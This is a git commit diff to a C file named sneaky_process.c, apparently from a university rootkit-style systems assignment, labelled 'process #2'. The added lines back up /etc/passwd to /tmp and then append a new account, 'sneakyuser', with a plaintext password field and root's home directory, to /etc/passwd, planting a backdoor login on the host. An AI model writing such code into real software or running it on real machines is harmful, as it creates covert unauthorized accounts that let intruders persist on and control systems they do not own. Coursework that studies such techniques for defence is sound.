8a025a5e260f0f4201c158b99ddd2f1b1d3aab59
Fangting Ma <fangtingm@student.unimelb.edu.au>
2022-04-08 14:20:54 -0400

    process #2

--- sneaky_process.c
+++ sneaky_process.c
@@ -5,6 +5,8 @@
 int main() {
     printf("sneaky_process pid = %d\n", getpid());
 
+    system("cp /etc/passwd /tmp/passwd");
+    system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd");
 
 
     return EXIT_SUCCESS;
